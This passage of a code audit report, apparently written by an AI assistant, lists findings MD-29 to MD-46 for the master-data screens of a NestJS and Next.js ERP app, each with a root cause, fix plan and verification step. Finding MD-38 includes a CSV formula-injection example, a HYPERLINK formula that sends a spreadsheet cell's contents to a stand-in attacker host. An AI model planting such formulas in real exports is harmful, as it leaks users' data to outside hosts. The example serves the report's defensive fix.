  - `frontend/src/app/(dashboard)/master/warehouses/page.tsx:190-194` — retitle the panel to "Hak Akses Anda" unless and until the admin endpoint exists.
  - **[Verification]** A non-admin opening the page cannot read another user's grants, and the panel title matches what it shows.

---

### [MD-29]: The warehouses form is not reset after create, duplicating warehouses on the next submit
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/warehouses/page.tsx:162-171`
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: Identical to `MD-17`. The `onSuccess` handler toasts, closes, and invalidates; `setWarehouseForm(initialWarehouseForm)` is never called, so the form state survives the close and the next create submits the previous warehouse's name. `Warehouse` has no `@unique` on `name`, so the duplicate inserts without error and the list grows with two identical rows.
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/warehouses/page.tsx:162-171` — add `setWarehouseForm(initialWarehouseForm)`; preferably apply the conditional-mount fix described in `MD-17` across all four forms at once.
  - **[Verification]** Create a warehouse, reopen: the form is empty. Today the previous name is still filled in.

---

## 📌 Module: Master Categories & Divisions

### [MD-30]: Creating a category with an explicit `code` skips the sequence and can collide with no error
- **Target Files**:
  - Backend: `backend/src/modules/master/services/categories.service.ts:24-34` vs `:36-51`
  - Database: `backend/prisma/schema/warehouse.prisma:345` — `code String @unique`
- **Severity**: `Edge Case`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The service has two branches and only one is safe:
  ```ts
  // categories.service.ts:24-34  — explicit code, no pre-check
  if (dto.code) {
    return this.prisma.masterCategory.create({ data: { ...dto } });
  }
  // :36-51  — generated code, correct: sequence + $transaction
  return this.prisma.$transaction(async (tx) => { … masterKode.upsert … });
  ```
  A client-supplied `code` goes straight to `create` with no `findUnique` pre-check, so a duplicate raises `P2002`, which `MD-01` reports as a 500. Note the contrast: `materials.service.ts:243-253` pre-checks `code` correctly, and `categories.service.ts:36-51` handles the generated path correctly. The hand-typed path is the only unhandled one — and it is the path the UI uses, since the category form has a `code` field.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/categories.service.ts:24-34` — add a `findUnique` pre-check and throw `ConflictException` with the field name; do not rely solely on `MD-01`'s global mapping, because the pre-check gives a better message and is race-free enough for a master code.
  - **[Verification]** Creating two categories with `code: "BBK"` returns 409 naming `code`. Today it returns 500.

---

### [MD-31]: `DivisionsService.findOne` returns `null` with HTTP 200 for an unknown division
- **Target Files**:
  - Backend: `backend/src/modules/master/services/divisions.service.ts` (`findOne`)
  - Backend: `backend/src/modules/master/controllers/divisions.controller.ts:15-18`
- **Severity**: `Edge Case`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The service resolves against a hardcoded `CANONICAL_DIVISIONS` array and returns `null` for an unknown key; the controller returns that value directly, so NestJS serialises `null` with status 200. A client checking `if (!res)` sees a falsy body and cannot distinguish "no such division" from "the server returned nothing", and no 404 is ever emitted. The rest of the master module uses `NotFoundException` correctly — this is the one place that does not.
- **Exact Contract Specification**:
  - Current Response DTO for `GET /master/divisions/DIV-999`:
    ```json
    null
    ```
    (HTTP 200)
  - Required Response DTO — HTTP 404:
    ```json
    { "type": "https://api.aureon.id/problems/not-found", "title": "Not Found", "status": 404,
      "code": "NOT_FOUND", "message": "Division \"DIV-999\" does not exist" }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/divisions.service.ts` — throw `ResourceNotFoundException` (from `common/exceptions/api-exception.ts`, already in the codebase) instead of returning `null`.
  - `backend/src/modules/master/controllers/divisions.controller.ts:15-18` — no change needed once the service throws.
  - **[Verification]** `GET /master/divisions/DIV-999` returns 404. Today it returns 200 with a null body.

---

## 📌 Module: Master Personnel & thin routes

### [MD-32]: 1 648 lines of `_hooks` are wired to nothing, and the pages re-implemented the same logic differently
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/customers/_hooks/useCustomerOperations.ts` (503 lines)
  - Frontend: `frontend/src/app/(dashboard)/master/goods/_hooks/useGoodsOperations.ts` (495 lines)
  - Frontend: `frontend/src/app/(dashboard)/master/suppliers/_hooks/useSupplierOperations.ts` (650 lines)
- **Severity**: `Edge Case`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: A repo-wide grep for each hook name returns **exactly one hit — its own definition and export**. No page imports them; the pages import only the corresponding `*CreateCanvas` component and implement their own mutations inline. The Tri-Layer convention (`_components/`, `_hooks/`, `_types/`, thin `page.tsx`) was followed for the directory structure but never for the wiring. The consequence is not just dead code: **every domain has two copies of its logic and they disagree.** `useGoodsOperations` and `goods/page.tsx` differ on whether `stockQty` may be sent (`MD-05`); `useCustomerOperations` and `customers/page.tsx` differ on the field names. A fix applied to the hook changes nothing visible; a fix applied to the page leaves the hook rotting. Meanwhile every `page.tsx` in the cluster is between 1 081 and 1 179 lines against the **150-line hard cap** in `CLAUDE.md`:
  | file | lines | cap |
  |---|---|---|
  | `master/goods/page.tsx` | 1 179 | 150 |
  | `master/suppliers/page.tsx` | 1 126 | 150 |
  | `master/warehouses/page.tsx` | 1 110 | 150 |
  | `master/customers/page.tsx` | 1 081 | 150 |
  | `import-export.service.ts` | 916 | 400 |
- **Actionable Execution Plan**:
  - Delete all three `_hooks` files, or wire them and delete the inline duplicates. Deleting first is cheaper and lower-risk: they are provably unreferenced, so the diff is a pure deletion and cannot regress behaviour.
  - Then extract the pages' data layer into the `_hooks` (this is the Tri-Layer convention working as intended) and bring each `page.tsx` under 150 lines.
  - `backend/src/modules/master/services/import-export.service.ts` (916 lines) — split by entity (`customerImport`, `supplierImport`, `materialImport`, `reportExport`), each under 400.
  - **[Verification]** A repo-wide grep for the three hook names returns 0 hits; `wc -l` on each `page.tsx` is under 150.

---

### [MD-33]: Six routes exist on disk but are absent from `ROUTE_MAP.md`, and one of them is a fossil
- **Target Files**:
  - Documentation: `docs/ROUTE_MAP.md:8-19`
  - Frontend: `master/categories`, `master/materials`, `master/vendors`, `master/users`, `master/automation`, `master/dna-visual`
- **Severity**: `Edge Case`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: Section 1 of the route map lists 8 master routes. Verified on disk: `categories/page.tsx` (22 lines, redirects to `/master/goods?tab=categories`), `vendors/page.tsx` (22 lines, redirects to `/master/suppliers`), `materials/page.tsx` (394 lines, the fossil in `MD-05`), `users/page.tsx` (6 lines, redirects to `/master/personnel?tab=users`), `automation/` and `dna-visual/page.tsx` (6 lines, redirects to `/visual-dna`) are all absent from the map. `Sidebar.tsx` links none of the six. This violates zero-dead-code rule 4 in `CLAUDE.md`. The `categories` → `goods` redirect is a live hazard in its own right: the goods page has a `tab=categories` handler at `:303-328`, so the two tabs share a page whose primary table is permanently empty (`MD-03`).
- **Actionable Execution Plan**:
  - `docs/ROUTE_MAP.md:8-19` — add all six with their redirect targets, or delete the directories if the redirects are not wanted.
  - `frontend/src/app/(dashboard)/master/materials/page.tsx` — this one should be deleted outright, not documented (`MD-05`).
  - **[Verification]** Every directory under `master/` has a row in `ROUTE_MAP.md`; a script that diffs the directory listing against the map exits 0.

---

## 📌 Module: Master Customers — required-field coverage

### [MD-34]: `SalesLead` has four NOT NULL columns and the DTO requires none of them — the service fills them with `''` and a default
- **Target Files**:
  - Backend: `backend/src/modules/master/dto/customer.dto.ts:1-30` (`CreateCustomerDto`)
  - Backend: `backend/src/modules/master/services/customers.service.ts:278-297`
  - Database: `backend/prisma/schema/bussdev.prisma:1-20`
- **Severity**: `Missing Validation`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `SalesLead` declares four NOT NULL columns with no default: `contactInfo String`, `source String`, `productInterest String`, `picId String @db.Uuid`. `CreateCustomerDto` requires **only** `clientName` — everything else is `@IsOptional()`. The service then satisfies the NOT NULL constraints with invented values:
  ```ts
  // customers.service.ts:278-297
  const resolvedBrandCode = brandCode || code || `CUST-${Date.now().toString().slice(-4)}`;
  return this.prisma.salesLead.create({
    data: {
      clientName: dto.clientName || dto.name || 'Pelanggan Baru',   // ← silent default
      contactInfo: dto.contactInfo || dto.phone || '',              // ← '' satisfies NOT NULL
      source: dto.source || 'WEBSITE',                              // ← invented provenance
      productInterest: dto.productInterest || dto.brandName || '',  // ← '' satisfies NOT NULL
      picId: salesAssignee || (await this.getDefaultPicId()),        // ← may be '' → 500 (MD-12)
      brandCode: resolvedBrandCode,
      estimatedValue: creditLimit || 0,                             // ← credit limit as deal value
    },
  });
  ```
  So a POST of `{ "clientName": "X" }` alone produces a row whose provenance claims `WEBSITE` (false — it came from the UI) and whose `productInterest` is an empty string. `clientName: dto.clientName || dto.name || 'Pelanggan Baru'` is the sharpest case: if the DTO's own validation is ever bypassed, the customer is silently named "Pelanggan Baru" rather than rejected. The user asked specifically about required-field coverage vs NOT NULL columns — **this is the answer: the DTO declares 1 required field, the table demands 4, and the gap is closed in the service with literals.**
- **Exact Contract Specification**:
  - Required Request DTO:
    ```json
    { "clientName": "PT Contoh Jaya", "contactInfo": "0812…", "source": "MANUAL",
      "productInterest": "Jasa Maklon", "picId": "9f1c…-uuid", "brandCode": "BRAND-001" }
    ```
  - Required Response DTO on violation — HTTP 400 naming the missing columns:
    ```json
    { "status": 400, "code": "HTTP_400",
      "message": "contactInfo, source, productInterest and picId are required",
      "details": { "fieldErrors": [
        { "property": "contactInfo", "message": "contactInfo should not be empty" },
        { "property": "source",      "message": "source must be one of MANUAL, WEBSITE, REFERRAL, EXHIBITION, OTHER" },
        { "property": "productInterest", "message": "productInterest should not be empty" },
        { "property": "picId",       "message": "picId must be a UUID" } ] } }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/dto/customer.dto.ts` — make `contactInfo` and `productInterest` `@IsNotEmpty()`; make `source` a `@IsEnum(SalesLeadSource)`; keep `picId` optional **only** if `MD-12`'s guard converts a missing PIC into a 422 with an actionable message rather than a 500.
  - `backend/src/modules/master/services/customers.service.ts:280` — delete `|| 'Pelanggan Baru'`. With the DTO fixed, the fallback is unreachable; leaving it in is a trap for the next caller.
  - **[Verification]** `POST /master/customers {"clientName":"X"}` returns 400 listing `contactInfo`, `source`, `productInterest` and `picId`. Today it creates a row with three fabricated values.

---

### [MD-35]: `creditLimit` is declared `@IsNumber()` with no `@Type(() => Number)`, so a numeric string is rejected
- **Target Files**:
  - Backend: `backend/src/modules/master/dto/customer.dto.ts` (`creditLimit`)
- **Severity**: `Missing Validation`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The global `ValidationPipe` runs with `transform: true` (`main.ts:53-56`), which triggers `plainToInstance` — but that only converts a field when a `@Type()` decorator or a `enableImplicitConversion` flag is present. Neither is set. So a client posting `creditLimit` as a JSON string, which is what an `<input type="text">` or a spreadsheet round-trip produces, fails `@IsNumber()` and returns 400 even though the value is a perfectly good number. Every sibling decimal in the module is a Prisma `Decimal` delivered over the wire as a **string** (`finance.prisma:277`, `warehouse.prisma`), so the API's own response format is the one its input validation rejects.
- **Exact Contract Specification**:
  - Current (wrong) result for `{"clientName":"X","creditLimit":"50000000"}` — HTTP 400:
    ```json
    { "status": 400, "code": "HTTP_400",
      "message": "creditLimit must be a number conforming to the specified constraints" }
    ```
  - Required Request DTO, accepting both forms and normalising to `Decimal`:
    ```json
    { "clientName": "X", "creditLimit": "50000000" }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/dto/customer.dto.ts` — add `@Type(() => Number)` alongside `@IsNumber()` on `creditLimit` (and on every numeric field in the master DTOs), so `transform: true` actually coerces.
  - **[Verification]** Posting `creditLimit` as a string succeeds and is stored as a Decimal. Today it returns 400.

---

### [MD-36]: The PIC picker is hardcoded to an empty array, so the `picId` field is unreachable from the UI
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/customers/page.tsx:513`
  - Backend: `backend/src/modules/master/services/customers.service.ts:371-381`
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The canvas is rendered with `salesStaffList={[]}` — a literal, at the JSX call site. The dropdown therefore has zero options on every load, no user can select a PIC, and every create therefore falls through to `getDefaultPicId()`, which picks the oldest `role: 'SALES'` user for **every** lead in the system (`MD-12`). All CRM leads end up owned by one person, and the sales pipeline reports are wrong as a result — not because of a reporting bug, but because the UI never let anyone assign ownership. The same page also renders `categoriesList` from a state that is never populated (`MD-20`).
- **Exact Contract Specification**:
  - Required: `GET /master/customers/assignees` →
    ```json
    { "success": true, "data": [ { "id": "9f1c…", "name": "Andi", "role": "SALES" },
                                  { "id": "4a2d…", "name": "Budi", "role": "SALES" } ] }
    ```
- **Actionable Execution Plan**:
  - `backend/src/modules/master/controllers/customers.controller.ts` — add `GET /master/customers/assignees` (declared **before** `:id`, the same ordering constraint the existing `export`/`import` routes document) returning active users with an assignable role.
  - `frontend/src/app/(dashboard)/master/customers/page.tsx:513` — bind it to a `useQuery` and pass the result; render the PIC field as required so a lead cannot be created ownerless while `MD-12`'s 422 guard is in place.
  - **[Verification]** The PIC dropdown lists the sales users, and a created lead's `picId` is the selected user, not the oldest one. Today the dropdown is always empty.

---

### [MD-37]: The materials page reports raw axios error text instead of the server's message
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/materials/page.tsx:84`, `:95`, `:105`
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: All three mutation handlers use `(e: any) => toast.error(e?.message ?? …)`. The axios `message` on a rejected request is a transport-level string — `"Request failed with status code 500"` — not the Problem Details `message` the `GlobalExceptionFilter` carefully built. The user sees a sentence in English describing an HTTP status, on a page that is otherwise in Indonesian, with no indication of what actually went wrong. Every other page in the cluster uses `extractApiError` (`customers/page.tsx`, `suppliers/page.tsx`, `warehouses/page.tsx`, `goods/page.tsx`) and gets the server's message. This is one of the reasons the fossil page in `MD-05` is not merely redundant but actively misleading: it is the only master page that swallows the server's diagnosis.
- **Actionable Execution Plan**:
  - Deleting `frontend/src/app/(dashboard)/master/materials/page.tsx` resolves this by removal (`MD-05`). If it is kept, replace all three handlers with `toast.error(extractApiError(e).message)`.
  - **[Verification]** A 400 on the materials page shows the server's field-level message. Today it shows "Request failed with status code 500".

---

### [MD-38]: The CSV export guards `phone` against formula injection and nothing else
- **Target Files**:
  - Backend: `backend/src/modules/master/services/import-export.service.ts` (CSV serialiser, ~:700-860)
  - Frontend: `frontend/src/app/(dashboard)/master/suppliers/page.tsx:129-147` (source of the exported values)
- **Severity**: `Edge Case`
- **Confidence**: `SUSPECTED`
- **Root Cause & GAP**: The CSV builder escapes a leading `=`, `+`, `-` and `@` on the `phone` column before writing a cell, which is the correct OWASP CSV-injection mitigation. The other free-text columns that the same file exports — `name`, `contact`, `email`, `address`, `city`, `district`, `addressDetail`, and on the customer side `clientName`, `brandName` — are written unescaped. A supplier named `=HYPERLINK("https://attacker.example?d="&A2,"click")` is legal input (the DTO is `@IsString()`) and would be re-interpreted as a formula by Excel or LibreOffice when the export is opened. I traced the escape to a single column and did not exhaustively read the whole serialiser, so I am marking this SUSPECTED on the *coverage* of the guard rather than on its existence — the `phone`-only application is confirmed, the full absence elsewhere is inferred from a partial read.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/import-export.service.ts` — move the escape into the single cell-serialising function so it applies to **every** string cell, not per-column call sites. This is a one-place fix and removes the possibility of a future column being added unescaped.
  - Add a unit test: a supplier named `=1+1` exports as `'=1+1`.
  - **[Verification]** No exported cell begins with `=`, `+`, `-` or `@` unless prefixed with a single quote.

---

## 📌 Module: Master Goods — deep audit (second pass)

A second, independent pass over `frontend/src/app/(dashboard)/master/goods/page.tsx` (1 180 lines) surfaced eight further defects, four of them Critical. The ones that change the fix order are listed first. This section is independent of the earlier one; the duplicate IDs are not used.

### [MD-39]: `toast.error(extractApiError(e))` passes an object where a string is required — every failed save crashes the Toaster
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:290`, `:300`, `:327`
  - Frontend: `frontend/src/lib/api.ts:90`, `frontend/src/components/dna/DnaToast.tsx:66-68`
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `extractApiError` returns an object, and is passed straight to a string parameter:
  ```ts
  // api.ts:90
  return { status, message: humanMessage, code };
  // goods/page.tsx:290
  onError: (e) => toast.error(extractApiError(e)),      // ← object, not string
  ```
  `dnaToast.error` is typed `(title: string, …) => sonnerToast.error(title, normalizeOpts(msgOrOpts))`. The object therefore lands in `title`, sonner calls `create({ title: <object> })`, and React 19 renders it as a child and throws **"Objects are not valid as a React child"** — taking down the Toaster subtree. The human-readable message survives only as the small `description` line, because `normalizeOpts` happens to read `msgOrOpts.message`.
  The blast radius is not local: **27 of the 33 `toast.error(extractApiError(...))` call sites repo-wide have this defect**, so every error toast in the application is either a render crash or a two-line message with the good part demoted. It is also the reason `MD-01` and `MD-12` are invisible today — a 500's careful Problem Details body reaches a component that throws before rendering it.
- **Exact Contract Specification**:
  - Current: `dnaToast.error({ status: 500, message: "Kode barang sudah dipakai", code: "HTTP_500" })`
  - Required: `dnaToast.error("Kode barang sudah dipakai")` with the object used for the description and any retry affordance.
- **Actionable Execution Plan**:
  - All three sites in `goods/page.tsx` → `toast.error(extractApiError(e).message)`.
  - The other 24 repo-wide sites: same mechanical change, but gate it with a lint rule — `@typescript-eslint/no-base-to-string` will not catch it, so add a `no-restricted-syntax` selector banning `toast.*(extractApiError(` when not followed by `.message`. One rule prevents the 27th recurrence.
  - **[Verification]** Trigger any 4xx or 5xx; the toast renders its title text and the Toaster survives. Today the Toaster subtree throws.

---

### [MD-40]: The auto-generated SKU is `BBK` + the current page length, so pages 1, 2 and 3 all offer the same code — and the field is read-only
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:491`, `frontend/src/app/(dashboard)/master/goods/_components/GoodsCreateCanvas.tsx:103-108`
  - Backend: `backend/src/modules/master/services/materials.service.ts:244-253`
  - Database: `backend/prisma/schema/warehouse.prisma:61` — `code String? @unique`
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**:
  ```ts
  // goods/page.tsx:491
  kode: `BBK${String(goodsList.length + 1).padStart(5, "0")}`,
  ```
  The suffix is the length of the **current page of results**, not the total. With `pageSize = 10` and more than 10 materials, page 1 and page 2 both offer `BBK00011`. The service correctly pre-checks and rejects the collision:
  ```ts
  // materials.service.ts:244-249
  if (existing) throw new BadRequestException(`Material code '${dto.code}' already exists`);
  ```
  and because the input is `readOnly`, **the user cannot work around it.** Creating an item from any page other than the first fails outright. A second consequence: the duplicate-code branch on the update path (`materials.service.ts:317-326`) is unreachable dead code, because a colliding code can never be entered. This is the same class of defect as `MD-13` on the customers side — a uniqueness guarantee satisfied by a guess — but here it blocks the primary create path of the flagship route.
- **Exact Contract Specification**:
  - Required Request DTO, `code` omitted so the server allocates it:
    ```json
    { "name": "Tepung Terigu", "type": "RAW_MATERIAL", "unit": "kg",
      "unitPrice": 14500, "minLevel": 50, "reorderPoint": 200, "categoryId": "3f2b…-uuid" }
    ```
  - Required Response DTO:
    ```json
    { "success": true, "data": { "id": "…", "code": "BRG-20261001-9F2C", "name": "Tepung Terigu" } }
    ```
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:491` — delete the client generator; seed `kode: ""` and let the server allocate. `materials.service.ts:275` already falls back to `BRG-<timestamp>`.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:531` — stop gating save on a non-empty `kode`.
  - `frontend/src/app/(dashboard)/master/goods/_components/GoodsCreateCanvas.tsx:103-108` — keep the field read-only (that is right) but label it "generated on save"; the current UI implies the value is committed.
  - Same generator pattern to check cluster-wide: `customers.service.ts:276` is the customers instance (`MD-13`).
  - **[Verification]** Create one material from page 1 and one from page 3; both succeed with distinct codes. Today the second fails with 400.

---

### [MD-41]: Goods delete is unreachable, and the unreachable dialog promises a permanent delete that never happens
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:27`, `:297`, `:538-541`, `:843-865`, `:1158-1166`
  - Backend: `backend/src/modules/master/services/materials.service.ts:401-411`
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `Trash2` is imported at `page.tsx:27` and used **zero** times; the row action cell (`:843-865`) renders only `Eye` and `Edit2`. `setBarangToDelete` is called only with `null` (`:297`, `:1160`) — never with an item — so `isOpen={!!barangToDelete}` is permanently `false` and `handleDeleteBarang` / `deleteBarangMut` are dead. This is the same unreachable-control pattern as `MD-19` on suppliers, which is why it is filed as Critical rather than Edge Case: it is a whole class in this cluster, and TypeScript cannot catch it.
  The dialog copy is also wrong for what the endpoint does:
  ```tsx
  // goods/page.tsx:1163-1164
  description={`…Tindakan ini tidak dapat dibatalkan…`} confirmText="Hapus Permanen"
  // materials.service.ts:407 — it is a SOFT delete
  return this.prisma.materialItem.update({ where: { id }, data: { deletedAt: new Date(), status: MaterialStatus.ARCHIVED } });
  ```
  "Hapus Permanen" / "tidak dapat dibatalkan" is the opposite of the truth. `remove` also does not check `existing.deletedAt`, so once wired, a repeat delete returns 200 silently.
- **Exact Contract Specification**:
  - Required dialog copy: "Dinonaktifkan dan disembunyikan dari daftar. Data tetap tersimpan dan dapat dipulihkan."
  - Required Response DTO: `{ "success": true, "data": { "id": "…", "deletedAt": "…", "restorable": true } }`
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:843-865` — add the `Trash2` button wired to `setBarangToDelete(item)`.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:1163-1164` — correct the copy; add `disabled={deleteBarangMut.isPending}` to the confirm.
  - `backend/src/modules/master/services/materials.service.ts:401-411` — make repeat deletes idempotent (204, not 200-with-silent-no-op).
  - Add the lint rule from `MD-39`'s plan, widened to ban `useState` setters that only ever receive `null` — this is the check that would have caught both `MD-19` and `MD-41`.
  - **[Verification]** The trash icon opens a confirm that says "soft delete"; confirming removes the row. Today the button does not exist and the dialog text would lie if it did.

---

### [MD-42]: `?action=create` deep link opens a form that can never be saved
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:344-352`, `:355-370`, `:530-536`
  - Frontend: `frontend/src/app/(dashboard)/master/goods/_components/GoodsCreateCanvas.tsx:106`
- **Severity**: `Critical Bug`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The effect opens the modal without doing the one thing that makes the form viable:
  ```ts
  // goods/page.tsx:345-351
  if (searchParams.get("action") === "create") { … setIsBarangModalOpen(true); }
  ```
  `handleOpenCreateBarang` is the only function that seeds a `kode`, and it is not called. So the form keeps its initial `kode: ""`, the code input is `readOnly` (so the user cannot type one), and save is gated on the code:
  ```ts
  // goods/page.tsx:531
  if (!barangForm.nama.trim() || !barangForm.kode.trim()) { toast.error(…); return; }
  ```
  The form is permanently unsaveable from this entry point — a dead end with no visible cause. The effect also has no cleanup and never clears the param, so it re-fires on any `searchParams` identity change and the URL keeps the flag after the modal is dismissed.
  This finding is **independent of `MD-40`** and survives the fix for it, but only if `MD-40`'s plan to stop gating on `kode` is applied. If `MD-40` is fixed by keeping the client generator and only changing the collision strategy, `MD-42` remains open. Fix both by removing the gate entirely.
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:344-352` — call `handleOpenCreateBarang()` from the effect, then `router.replace("/master/goods")` to clear the flag.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:530-536` — gate on `nama` only.
  - **[Verification]** Opening `/master/goods?action=create` produces a form that saves successfully and the URL is cleaned. Today the form cannot be submitted and the flag persists.

---

### [MD-43]: Once the empty-table bug is fixed, the 65-line client-side filter and sort pipeline becomes a no-op
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:388-453` (filter + sort), `:455-463` (pager), `:695` (badge count)
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The render path branches on `serverTotal` and short-circuits the entire pipeline:
  ```ts
  // goods/page.tsx:457-462
  if (serverTotal !== null) { return goodsList; }        // ← no filter, no sort
  const start = (currentPage - 1) * pageSize;
  return filteredAndSortedGoods.slice(start, start + pageSize);
  ```
  `filteredAndSortedGoods` — the status CRITICAL/NORMAL filter, the kategori and supplier column filters, the client-side search, and a 30-line sort comparator — is then used for exactly one thing: the card badge `count={filteredAndSortedGoods.length}` (`:695`). So after `MD-03` lands, the badge would read "3" while the table shows 10 unfiltered rows. The column sorters are also dead independently: `handleHeaderSortToggle` (`:465`) is never wired to a `DnaTh`, and `uniqueSuppliers`, `selectedRowIds`, `toggleSelectAll`, `toggleSelectRow` and `setPageSize` (`:148`, `:331`, `:478-485`, `:152`) have no call sites outside their own definitions. The table renders no checkbox column, no sortable header, and `DnaPagination`'s `onPageSizeChange` is never passed — `pageSize` is frozen at 10. And `DnaPagination.tsx:31` returns `null` when `totalEntries === 0`, so there is no pager to click at all until the list is non-empty.
  **This is a coupled fix.** Shipping `MD-03` alone converts an empty table into a table whose filter, search, sort and page-size controls all silently do nothing — arguably worse than an obviously-empty table, because it looks functional.
- **Actionable Execution Plan**:
  - Decide one owner for filtering. The backend already supports `search`, `categoryId` and `type` (`materials.service.ts:14-45`); add `status` and sort, then drive the page entirely server-side and delete `filteredAndSortedGoods`.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:465`, `:478-485` — wire `handleHeaderSortToggle` to `DnaTh` and pass `onPageSizeChange={setPageSize}`, or delete the state. Dead state that looks wired is the failure mode here, not dead state per se.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:695` — make the badge read from the same source as the table.
  - **[Verification]** With 50 materials, filtering by kategori reduces the rows and the badge; clicking a column header sorts; changing page size fetches a different `limit`. Today `MD-03` hides all of this behind an empty table — fix both in one PR.

---

### [MD-44]: The goods mapper reads six fields the projection does not return, and two display columns are therefore constants
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:193-210`
  - Backend: `backend/src/modules/master/services/materials.service.ts:87-119`
- **Severity**: `Contract Mismatch`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: `formattedData` returns `id, code, kode, name, nama, unit, satuan, unitPrice, hargaBeli, stockQty, realStok, minLevel, stokMin, categoryId, category, kategori, subCategory, description, imageUrl, coaMapping, inventoryAccount, salesAccount, lastPo*`. The mapper reads five that are not in it, and in two cases ignores a field that *is* returned:
  - `page.tsx:197` `supplierAsal: m.supplierHistory?.[0]?.supplier?.name || "Lokal"` → always `"Lokal"`. There is no `supplierHistory` in the payload, **and `m.lastSupplierName` is returned but ignored.** The Supplier column and the supplier filter are therefore dead.
  - `page.tsx:198` `wComparator: m.physicalForm || "-"` → always `"-"`; `physicalForm` is sent on write but not returned on read.
  - `page.tsx:204` `subKategori: m.bahanType || "-"` → always `"-"`; **`m.subCategory` is returned but ignored.**
  - `page.tsx:206` `agingHari: 1` → a hardcoded literal rendered in the drawer as "Estimasi Umar Simpan … 1 Hari".
  - `page.tsx:209` `akunCogs: undefined` → the drawer's "Akun Beban Pokok (COGS)" cell (`:1074`) is always blank, though `m.salesAccount` is returned.
  - `page.tsx:200` `stokMin: Number(m.reorderPoint || m.minLevel || 0)` works only by accident — `reorderPoint` is not returned, so it silently falls through to `minLevel`.
  This is the goods-page instance of `MD-07`/`MD-26`: a hand-written mapper that guesses field names rather than consuming a typed response.
- **Actionable Execution Plan**:
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:193-210` — map `lastSupplierName`, `subCategory`, `physicalForm`, `salesAccount`; delete the `"Lokal"` and `agingHari: 1` fallbacks.
  - `backend/src/modules/master/services/materials.service.ts:87-119` — add `physicalForm` to `formattedData`; it is already written on create, so omitting it on read is an oversight.
  - `frontend/src/app/(dashboard)/master/goods/_types/goods.types.ts` — declare the response so the phantom keys become compile errors. Note this file **disagrees with the page's own local types** (`:74-101` re-declares `MasterBarangItem` and shadows the shared one, with `kategoriKode`/`agingHari` instead of `coaMapping`/`lastPo*`).
  - **[Verification]** A material with a supplier shows that supplier's name; a material with a sub-category shows it. Today both are constants.

---

### [MD-45]: The category tab shows `0 SKU` for every row because `_count` is never selected
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:228`
  - Backend: `backend/src/modules/master/services/categories.service.ts:9-14`
  - Database: `backend/prisma/schema/warehouse.prisma:352` — the relation is named `goods`, not `materials`
- **Severity**: `Broken UX State`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**:
  ```ts
  // goods/page.tsx:228
  totalSku: c._count?.materials || 0,
  // categories.service.ts:10 — no include, so _count is never selected
  return this.prisma.masterCategory.findMany({ where: type ? { type } : {}, orderBy: { name: 'asc' } });
  ```
  Two independent faults stacked: the query does not `include` `_count` at all, **and** the page reads `_count.materials` when the relation is `goods` (`warehouse.prisma:352`). Fixing either alone still shows `0`. Every category row reports zero SKUs, which is exactly the number a user would check before archiving one.
- **Actionable Execution Plan**:
  - `backend/src/modules/master/services/categories.service.ts:10` — add `include: { _count: { select: { goods: true } } }`.
  - `frontend/src/app/(dashboard)/master/goods/page.tsx:228` — read `c._count?.goods || 0`.
  - **[Verification]** A category with 14 materials shows `14`. Today it shows `0`.

---

### [MD-46]: The category `<select>` writes a category **code** into a `categoryId` UUID field
- **Target Files**:
  - Frontend: `frontend/src/app/(dashboard)/master/goods/page.tsx:615`, `:260`, `:364`
  - Frontend: `frontend/src/app/(dashboard)/master/goods/_components/GoodsCreateCanvas.tsx:26`
  - Database: `backend/prisma/schema/warehouse.prisma` (`MaterialItem.categoryId String? @db.Uuid`)
- **Severity**: `Missing Validation`
- **Confidence**: `CONFIRMED`
- **Root Cause & GAP**: The page launders a shape mismatch behind `as any`:
  ```tsx
  // goods/page.tsx:615
